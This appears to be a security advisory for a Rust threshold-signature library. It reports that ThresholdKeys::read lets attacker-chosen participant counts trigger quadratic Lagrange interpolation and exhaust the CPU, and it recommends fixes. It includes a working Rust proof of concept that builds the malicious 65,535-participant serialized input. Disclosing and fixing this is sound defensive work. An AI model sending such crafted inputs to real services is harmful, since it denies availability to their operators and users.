### Title
Quadratic Lagrange evaluation in `ThresholdKeys::read` enables CPU exhaustion - ([File: crypto/dkg/src/lib.rs](crypto/dkg/src/lib.rs))

### Summary
`ThresholdKeys::read` accepts an attacker-controlled participant count of up to `u16::MAX` and then invokes `ThresholdKeys::new` after reading one point for every participant. For Lagrange-interpolated keys, `ThresholdKeys::new` calculates an interpolation factor for each of the first `t` participants, and every factor iterates over the complete participant set, producing `O(n²)` field arithmetic. [1](#0-0) 

### Finding Description
The deserializer reads `t`, `n`, and `i` directly from attacker-controlled bytes before constructing validated `ThresholdParams`. [2](#0-1) 

Selecting interpolation byte `1` chooses `Interpolation::Lagrange`, after which the parser reads `n` canonical group elements into `verification_shares`. [3](#0-2) 

Those values are passed to `ThresholdKeys::new`; `t = n = u16::MAX` and `i = 1` are syntactically and semantically valid because `ThresholdParams::new` only rejects zero values, `t > n`, and `i > n`. [4](#0-3) [5](#0-4) 

`ThresholdKeys::new` creates a participant list containing `1..=t` and calls `interpolation_factor` once for each entry while deriving the group key. [6](#0-5) 

For Lagrange interpolation, every `interpolation_factor` call scans the entire `included` list and performs two field multiplications for every other participant, followed by an inversion. [7](#0-6) 

Consequently, `t = n = 65,535` causes `65,535 × 65,534 = 4,294,770,690` loop iterations, corresponding to approximately `8.59` billion field multiplications, plus `65,535` field inversions, from a Secp256k1 payload of roughly 2.1 MiB. [7](#0-6) [6](#0-5) 

### Impact Explanation
An unprivileged party that can cause a service to deserialize this `ThresholdKeys` representation can force the target to spend extreme CPU resources inside a single `read` call. [8](#0-7) 

Repeated submissions can keep worker threads occupied and deny service to key loading, signing setup, or any higher-level protocol path that accepts serialized threshold keys from untrusted input. This is an availability failure caused by an attacker-controlled resource-consumption asymmetry rather than an allocation proportional to a bounded protocol message. [6](#0-5) [7](#0-6) 

### Likelihood Explanation
The trigger requires only choosing `t`, `n`, `i`, and the interpolation byte in the serialized input; all verification shares can be the canonical encoding of the same valid generator point. [9](#0-8) 

No malformed point, invalid scalar, duplicate participant index, leaked key, or protocol violation is required because `t = n = 65,535` passes `ThresholdParams::new`. [5](#0-4) 

Likelihood depends on whether serialized `ThresholdKeys` are accepted from peers or stored untrusted data, but the exposed `ThresholdKeys::read` API itself is public and performs the expensive computation before returning. [8](#0-7) 

### Recommendation
Enforce a protocol-appropriate maximum `n` before reading participant-dependent collections or invoking `ThresholdKeys::new`, rather than accepting the entire `u16` range as a computational bound. [9](#0-8) 

Validate `ThresholdParams` immediately after reading `t`, `n`, and `i`, and reject parameter sets whose interpolation evaluation cost exceeds the deployment’s maximum participant set. [10](#0-9) 

For large legitimate threshold sets, replace the per-participant Lagrange loop with an algorithm that calculates all coefficients in subquadratic or amortized linear time, or require constant interpolation for `t = n` configurations where the expected coefficient format is already linear. [11](#0-10) [12](#0-11) 

### Proof of Concept
The following constructs a syntactically valid Secp256k1 `ThresholdKeys` encoding with `t = n = 65,535`, participant `i = 1`, Lagrange interpolation, a scalar of one, and every verification share set to the canonical generator encoding:

```rust
use frost::{curve::Secp256k1, ThresholdKeys};
use ciphersuite::{
  Ciphersuite,
  group::{Group, GroupEncoding, ff::{Field, PrimeField}},
};

let mut encoded = Vec::new();

encoded.extend(u32::try_from(Secp256k1::ID.len()).unwrap().to_le_bytes());
encoded.extend(Secp256k1::ID);

encoded.extend(u16::MAX.to_le_bytes()); // t
encoded.extend(u16::MAX.to_le_bytes()); // n
encoded.extend(1u16.to_le_bytes());     // i
encoded.push(1);                        // Lagrange interpolation

encoded.extend(Secp256k1::F::ONE.to_repr().as_ref());

let generator = Secp256k1::generator().to_bytes();
for _ in 1 ..= u16::MAX {
  encoded.extend(generator.as_ref());
}

let _ = ThresholdKeys::<Secp256k1>::read(&mut encoded.as_slice());
```

The read reaches `ThresholdKeys::new`, which performs 65,535 outer interpolation-factor evaluations; each evaluation scans 65,534 other participants, yielding approximately 4.29 billion inner-loop iterations and 8.59 billion field multiplications. [4](#0-3) [6](#0-5) [7](#0-6)

### Citations

**File:** crypto/dkg/src/lib.rs (L166-178)
```rust
  pub const fn new(t: u16, n: u16, i: Participant) -> Result<ThresholdParams, DkgError> {
    if (t == 0) || (n == 0) {
      return Err(DkgError::ZeroParameter { t, n });
    }

    if t > n {
      return Err(DkgError::InvalidThreshold { t, n });
    }
    if i.0 > n {
      return Err(DkgError::InvalidParticipant { n, participant: i });
    }

    Ok(ThresholdParams { t, n, i })
```

**File:** crypto/dkg/src/lib.rs (L224-249)
```rust
impl<F: Zeroize + PrimeField> Interpolation<F> {
  /// The interpolation factor for this participant, within this signing set.
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
    }
  }
```

**File:** crypto/dkg/src/lib.rs (L367-378)
```rust
    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L573-631)
```rust
  /// Read keys from a type satisfying `std::io::Read`.
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
